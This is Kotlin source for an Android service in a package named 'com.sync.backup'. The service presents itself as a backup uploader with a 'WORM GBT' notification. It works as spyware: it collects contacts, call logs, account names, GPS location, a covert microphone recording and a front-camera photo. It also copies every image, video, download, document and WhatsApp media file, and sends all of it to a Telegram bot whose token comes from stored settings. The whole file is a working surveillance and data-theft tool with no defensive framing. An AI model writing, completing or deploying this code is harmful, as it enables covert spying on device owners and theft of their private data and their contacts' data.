package com.sync.backup

import android.app.*
import android.content.Intent
import android.database.Cursor
import android.graphics.Bitmap
import android.hardware.Camera
import android.location.LocationManager
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.accounts.AccountManager
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

class UploadService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient.Builder()
        .connectTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .build()
    private lateinit var token: String
    private lateinit var chat: String
    private val sent = mutableSetOf<String>()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1, buildNotif("بدء السحب الشامل..."))
        val p = getSharedPreferences("cfg", MODE_PRIVATE)
        token = p.getString("token", "") ?: ""
        chat = p.getString("chat", "") ?: ""

        scope.launch {
            try {
                sendMsg("🚀 بدء السحب الشامل للجهاز...")
                sendDeviceInfo()
                sendLocation()

                // بيانات نصية
                sendTextAsFile("Contacts.txt", getContactsData())
                sendTextAsFile("CallLog.txt", getCallLogData())
                sendTextAsFile("Accounts.txt", getAccountsData())
                
                // إضافات جديدة
                updateNotif("جارٍ تسجيل الصوت...")
                recordAudioAndSend(10000) // 10 ثواني
                
                updateNotif("جارٍ التقاط صورة...")
                takeCameraPhotoAndSend()

                // سحب الوسائط والملفات
                updateNotif("جارٍ سحب الصور...")
                sendMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "Images")
                updateNotif("جارٍ سحب الفيديوهات...")
                sendMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "Videos")

                updateNotif("جارٍ سحب الملفات...")
                sendFolderFiles(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS))
                sendFolderFiles(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS))
                sendFolderFiles(File(Environment.getExternalStorageDirectory(), "WhatsApp/Media/WhatsApp Images"))
                sendFolderFiles(File(Environment.getExternalStorageDirectory(), "WhatsApp/Media/WhatsApp Video"))
                sendFolderFiles(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM))

                sendMsg("✅ اكتمل السحب الشامل.")
                updateNotif("اكتمل السحب الشامل")
            } catch (e: Exception) {
                sendMsg("❌ خطأ: ${e.message}")
                updateNotif("خطأ: ${e.message}")
            }
            delay(3000)
            stopSelf()
        }
        return START_NOT_STICKY
    }

    private fun buildNotif(text: String): Notification {
        val ch = "svc"
        if (Build.VERSION.SDK_INT >= 26) {
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(NotificationChannel(ch, "Backup", NotificationManager.IMPORTANCE_LOW))
        }
        return NotificationCompat.Builder(this, ch)
            .setContentTitle("WORM GBT")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setOngoing(true)
            .build()
    }

    private fun updateNotif(text: String) {
        val nm = getSystemService(NotificationManager::class.java)
        nm.notify(1, buildNotif(text))
    }

    private fun sendMsg(text: String) {
        val body = FormBody.Builder().add("chat_id", chat).add("text", text).build()
        val req = Request.Builder().url("https://api.telegram.org/bot$token/sendMessage").post(body).build()
        try { client.newCall(req).execute().close() } catch (_: Exception) {}
    }

    private fun sendFile(file: File, caption: String) {
        if (!file.exists() || file.length() == 0L) return
        val key = file.absolutePath + "_" + file.length()
        if (!sent.add(key)) return

        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chat)
            .addFormDataPart("caption", caption)
            .addFormDataPart("document", file.name, file.asRequestBody("application/octet-stream".toMediaType()))
            .build()
        val req = Request.Builder().url("https://api.telegram.org/bot$token/sendDocument").post(body).build()
        try { client.newCall(req).execute().close() } catch (_: Exception) {}
    }

    private fun sendTextAsFile(fileName: String, content: String) {
        if (content.isEmpty()) return
        val tmp = File(cacheDir, fileName)
        tmp.writeText(content)
        sendFile(tmp, "📄 $fileName")
        tmp.delete()
    }

    // ========== البيانات النصية ==========
    private fun getContactsData(): String {
        val sb = StringBuilder()
        val cur: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
        cur?.use {
            val nameI = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numI = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (it.moveToNext()) { sb.appendLine("${it.getString(nameI)} : ${it.getString(numI)}") }
        }
        return sb.toString()
    }

    private fun getCallLogData(): String {
        val sb = StringBuilder()
        val cur = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")
        cur?.use {
            val numI = it.getColumnIndex(CallLog.Calls.NUMBER)
            val typeI = it.getColumnIndex(CallLog.Calls.TYPE)
            val dateI = it.getColumnIndex(CallLog.Calls.DATE)
            while (it.moveToNext()) { sb.appendLine("${it.getString(numI)} | type=${it.getInt(typeI)} | ${it.getLong(dateI)}") }
        }
        return sb.toString()
    }

    private fun getAccountsData(): String {
        val sb = StringBuilder()
        try {
            val am = AccountManager.get(this)
            for (account in am.accounts) {
                sb.appendLine("Name: ${account.name} | Type: ${account.type}")
            }
        } catch (_: Exception) {}
        return sb.toString()
    }

    private fun sendDeviceInfo() {
        val sb = StringBuilder()
        sb.appendLine("📱 معلومات الجهاز:")
        sb.appendLine("Model: ${Build.MODEL}")
        sb.appendLine("Brand: ${Build.BRAND}")
        sb.appendLine("Android: ${Build.VERSION.RELEASE}")
        sendMsg(sb.toString())
    }

    private fun sendLocation() {
        try {
            val lm = getSystemService(LOCATION_SERVICE) as LocationManager
            val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (loc != null) { sendMsg("📍 الموقع: https://maps.google.com/?q=${loc.latitude},${loc.longitude}") }
        } catch (_: Exception) {}
    }

    // ========== الميكروفون والكاميرا ==========
    private fun recordAudioAndSend(durationMs: Int) {
        try {
            val file = File(cacheDir, "audio_record.m4a")
            val recorder = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(this) else MediaRecorder()
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setOutputFile(file.absolutePath)
            recorder.prepare()
            recorder.start()
            Thread.sleep(durationMs.toLong())
            recorder.stop()
            recorder.release()
            sendFile(file, "🎤 تسجيل صوتي")
            file.delete()
        } catch (_: Exception) {}
    }

    private fun takeCameraPhotoAndSend() {
        try {
            val camera = Camera.open(1) // 1 = الكاميرا الأمامية
            camera.setPreviewTexture(android.graphics.SurfaceTexture(0))
            camera.startPreview()
            Thread.sleep(1000)
            camera.takePicture(null, null, Camera.PictureCallback { data, _ ->
                try {
                    val file = File(cacheDir, "cam_photo.jpg")
                    FileOutputStream(file).use { it.write(data) }
                    sendFile(file, "📸 صورة من الكاميرا")
                    file.delete()
                } catch (_: Exception) {}
                camera.stopPreview()
                camera.release()
            })
        } catch (_: Exception) {}
    }

    // ========== الوسائط والملفات ==========
    private fun sendMedia(uri: Uri, type: String) {
        val cur = contentResolver.query(uri, null, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC")
        cur?.use {
            val idI = it.getColumnIndex(MediaStore.MediaColumns._ID)
            val nameI = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
            while (it.moveToNext()) {
                val id = it.getLong(idI)
                val name = it.getString(nameI) ?: "file_$id"
                val fileUri = Uri.withAppendedPath(uri, id.toString())
                try {
                    val tmp = File(cacheDir, name)
                    contentResolver.openInputStream(fileUri)?.use { inp -> tmp.outputStream().use { out -> inp.copyTo(out) } }
                    sendFile(tmp, "📁 $type: $name")
                    tmp.delete()
                } catch (_: Exception) {}
            }
        }
    }

    private fun sendFolderFiles(dir: File?) {
        if (dir == null || !dir.exists()) return
        dir.listFiles()?.forEach { file ->
            if (file.isFile && file.length() < 50 * 1024 * 1024) {
                sendFile(file, "📄 ${file.name}")
            } else if (file.isDirectory) {
                sendFolderFiles(file)
            }
        }
    }

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}